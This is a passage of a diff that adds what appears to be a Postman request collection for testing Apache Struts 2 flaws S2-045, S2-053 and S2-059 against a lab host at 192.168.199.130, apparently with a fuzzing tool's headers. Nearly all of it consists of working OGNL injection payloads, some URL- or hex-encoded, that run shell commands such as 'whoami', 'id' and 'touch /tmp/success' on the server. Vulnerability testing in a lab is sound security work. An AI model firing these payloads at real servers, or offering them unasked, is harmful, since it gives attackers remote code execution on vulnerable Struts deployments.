+						"value": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,8",
+						"disabled": true
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,8"
+					}
+				],
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-045/index.action",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-045",
+						"index.action"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-053",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {
+					"content-type": true
+				}
+			},
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,5",
+						"disabled": true
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,5"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A%0D%0A"
+				},
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-053/hello.action",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-053",
+						"hello.action"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-059-1",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {
+					"content-type": true
+				}
+			},
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,5"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,5",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "id=%25%7b%28%23%63%6f%6e%74%65%78%74%3d%23%61%74%74%72%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%29%2e%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%74%6f%75%63%68%20%2f%74%6d%70%2f%73%75%63%63%65%73%73%27%29%29%7d"
+				},
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-059/index.action",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-059",
+						"index.action"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-059-2",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {
+					"content-type": true
+				}
+			},
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "id=%25%7b%28%23%63%6f%6e%74%65%78%74%3d%23%61%74%74%72%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%29%2e%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%74%6f%75%63%68%20%2f%74%6d%70%2f%73%75%63%63%65%73%73%27%29%29%7d"
+				},
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-059/index.action",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-059",
+						"index.action"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
